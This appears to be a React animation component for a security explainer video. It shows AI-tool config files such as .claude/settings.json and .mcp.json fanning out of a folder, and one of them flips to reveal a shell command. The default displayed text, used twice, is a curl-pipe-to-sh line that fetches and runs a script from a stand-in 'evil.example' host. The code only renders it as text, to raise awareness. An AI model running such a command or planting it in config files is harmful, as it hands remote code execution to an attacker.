import React from "react";
import type { CardProps } from "../props";
import {
  BFolderBack, BFolderFlap, BPage, FOLDER_R,
  clamp01, easeIO, easeOut, easeBack, at, mono, INK, MUTED, ACCENT,
} from "./BShared";

// V6 "and I never really thought about the safety of AI config files."
// V7 "some of those files are not just settings."  (callback: the same fan, changed)
//
// The folder from V2 flips open on a real hinge and the six files nobody ever looks at rise
// out of it and fan up to the right, the way a macOS stack fans. They are drawn as hidden
// files are read: half-lit, dotfile names in mono. In V7 the three that matter solidify, the
// word `settings` inside the first one is struck out, and that chip turns on its vertical
// axis: its back is a shell command. A settings file that is a command.

const ROWS = [
  ".claude/settings.json",
  ".mcp.json",
  ".vscode/tasks.json",
  ".cursor/mcp.json",
  ".gemini/settings.json",
  "CLAUDE.md",
];

const ROW_W = 425, ROW_H = 48, GLYPH_W = 36;
const FOLD_W = 230, FOLD_X = 56, FOLD_Y = 386;
const MOUTH_X = FOLD_X + 22, MOUTH_Y = FOLD_Y + 4;
const FLIP_X = 86, FLIP_Y = 238, FLIP_W = 800, FLIP_H = 96;

const slotX = (i: number) => 214 + i * 24;
const slotY = (i: number) => 348 - i * 62;
const slotRot = (i: number) => 2.6 - i * 1.05;

type FanProps = {
  k: number;
  open: number;
  rise: (i: number) => number;
  solid: (i: number) => number;
  strike: number;
  flip: number;
  repo: string;
  cmd: string;
};

/** the name, with one word inside it strikeable */
const RowName: React.FC<{ text: string; px: number; color: string; strikeWord?: string; strike: number }> = ({
  text, px, color, strikeWord, strike,
}) => {
  if (!strikeWord || !text.includes(strikeWord) || strike <= 0) {
    return <span style={{ ...mono(px, color) }}>{text}</span>;
  }
  const i = text.indexOf(strikeWord);
  return (
    <span style={{ ...mono(px, color) }}>
      {text.slice(0, i)}
      <span style={{ position: "relative" }}>
        {strikeWord}
        <span
          style={{
            position: "absolute", left: 0, right: 0, top: "50%", height: Math.max(2, px * 0.09),
            backgroundColor: ACCENT, transformOrigin: "left center", transform: `scaleX(${easeOut(strike)})`,
          }}
        />
      </span>
      {text.slice(i + strikeWord.length)}
    </span>
  );
};

const Fan: React.FC<FanProps> = ({ k, open, rise, solid, strike, flip, repo, cmd }) => {
  const P = (v: number) => v * k;
  const foldH = FOLD_W * FOLDER_R;
  const recede = easeIO(flip);
  const dim = 1 - 0.82 * recede;

  // row 0 rises like the others, then flies out of the fan, grows and turns
  const fp = easeIO(flip);
  const r0 = easeBack(rise(0));
  const bx = MOUTH_X + (slotX(0) - MOUTH_X) * r0;
  const by = MOUTH_Y + (slotY(0) - MOUTH_Y) * r0;
  const bs = 0.68 + 0.32 * r0;
  const fx = bx + (FLIP_X - bx) * fp;
  const fy = by + (FLIP_Y - by) * fp;
  const fw = ROW_W + (FLIP_W - ROW_W) * fp;
  const fh = ROW_H + (FLIP_H - ROW_H) * fp;
  const fScale = bs + (1 - bs) * fp;
  const fRot = slotRot(0) * r0 * (1 - fp);
  const fGlyph = GLYPH_W + 16 * fp;
  const fFont = 28 + 2 * fp;
  const fPad = 12 + 14 * fp;

  const row = (i: number) => {
    const r = easeBack(rise(i));
    const sol = easeOut(solid(i));
    const lit = 0.62 + 0.38 * sol;
    const x = MOUTH_X + (slotX(i) - MOUTH_X) * r;
    const y = MOUTH_Y + (slotY(i) - MOUTH_Y) * r;
    const sc = 0.68 + 0.32 * r;
    return (
      <div
        key={ROWS[i]}
        style={{
          position: "absolute", left: P(x), top: P(y), width: P(ROW_W), height: P(ROW_H),
          transform: `scale(${sc}) rotate(${slotRot(i) * r}deg)`, transformOrigin: "50% 50%",
          opacity: clamp01(rise(i) * 2.4) * lit * dim,
          backgroundColor: `rgba(255,255,255,${0.04 + 0.05 * sol})`,
          border: `${Math.max(1, P(1.6))}px ${sol > 0.5 ? "solid" : "dashed"} rgba(201,207,216,${0.4 + 0.4 * sol})`,
          boxSizing: "border-box",
          display: "flex", alignItems: "center", paddingLeft: P(12), gap: P(14),
        }}
      >
        <BPage w={P(GLYPH_W)} ghost={sol < 0.5} />
        <RowName text={ROWS[i]} px={P(28)} color={sol > 0.5 ? INK : MUTED} strike={0} />
      </div>
    );
  };

  return (
    <div style={{ position: "absolute", inset: 0 }}>
      {/* the folder, open, still wearing the shield it got on "safe." */}
      <div style={{ position: "absolute", left: P(FOLD_X), top: P(FOLD_Y), width: P(FOLD_W), height: P(foldH), opacity: dim }}>
        <BFolderBack w={P(FOLD_W)} open={open} uid="gh" />
        <BFolderFlap w={P(FOLD_W)} open={open} uid="gh" shield={1} />
      </div>
      <div
        style={{
          position: "absolute", left: 0, top: P(FOLD_Y + foldH + 10), width: P(FOLD_X * 2 + FOLD_W),
          textAlign: "center", ...mono(P(26), MUTED), opacity: dim,
        }}
      >
        {repo}
      </div>

      {/* five of them stay ghosts */}
      {[5, 4, 3, 2, 1].map((i) => row(i))}

      {/* the settings file: in the fan, then turned over */}
      <div style={{ position: "absolute", left: P(fx), top: P(fy), width: P(fw), height: P(fh),
        perspective: P(1600), zIndex: 5, opacity: clamp01(rise(0) * 2.4) }}>
        <div
          style={{
            position: "relative", width: "100%", height: "100%",
            transformStyle: "preserve-3d",
            transform: `rotate(${fRot}deg) rotateY(${180 * fp}deg) scale(${fScale})`,
            transformOrigin: "50% 50%",
          }}
        >
          {/* front: the file as it is filed */}
          <div
            style={{
              position: "absolute", inset: 0, backfaceVisibility: "hidden", WebkitBackfaceVisibility: "hidden",
              opacity: 0.62 + 0.38 * easeOut(solid(0)),
              backgroundColor: `rgba(255,255,255,${0.03 + 0.05 * easeOut(solid(0))})`,
              border: `${Math.max(1, P(1.6))}px ${solid(0) > 0.5 ? "solid" : "dashed"} rgba(201,207,216,${0.35 + 0.45 * easeOut(solid(0))})`,
              boxSizing: "border-box",
              display: "flex", alignItems: "center", paddingLeft: P(fPad), gap: P(14),
            }}
          >
            <BPage w={P(fGlyph)} ghost={solid(0) < 0.5} />
            <RowName text={ROWS[0]} px={P(fFont)} color={solid(0) > 0.5 ? INK : MUTED}
              strikeWord="settings" strike={strike} />
          </div>
          {/* back: it is not settings, it is a command */}
          <div
            style={{
              position: "absolute", inset: 0, backfaceVisibility: "hidden", WebkitBackfaceVisibility: "hidden",
              transform: "rotateY(180deg)",
              backgroundColor: "#120C09",
              border: `${Math.max(1, P(2))}px solid ${ACCENT}`, boxSizing: "border-box",
              display: "flex", alignItems: "center", paddingLeft: P(26),
            }}
          >
            <span style={{ ...mono(P(30), ACCENT) }}>{cmd}</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export type GhostsData = { repo?: string; cmd?: string };

/** V6: the folder opens and the six files nobody reads rise out of it */
export const BGhosts: React.FC<CardProps & { data: GhostsData }> = ({ tMs, w, beats, data }) => {
  const k = w / 972;
  const bSafety = beats.safety ?? 21554;
  const bOf = beats.of ?? 21914;
  const open = at(tMs, bSafety, 340);
  const rise = (i: number) => at(tMs, bOf + i * 120, 360);
  return (
    <Fan
      k={k} open={open} rise={rise} solid={() => 0} strike={0} flip={0}
      repo={data.repo ?? "awesome-project"}
      cmd={data.cmd ?? "curl -s https://evil.example/x.sh | sh"}
    />
  );
};

export type FlipData = GhostsData;

/** V7: three of them solidify, and the settings file turns over */
export const BFlip: React.FC<CardProps & { data: FlipData }> = ({ tMs, w, beats, data }) => {
  const k = w / 972;
  const bSome = beats.some ?? 23800;
  const bNot = beats.not ?? 24950;
  const bSettings = beats.settings ?? 25310;
  const solid = (i: number) => (i <= 2 ? at(tMs, bSome + i * 80, 280) : 0);
  return (
    <Fan
      k={k} open={1} rise={() => 1} solid={solid}
      strike={at(tMs, bNot, 240)} flip={at(tMs, bSettings, 480)}
      repo={data.repo ?? "awesome-project"}
      cmd={data.cmd ?? "curl -s https://evil.example/x.sh | sh"}
    />
  );
};
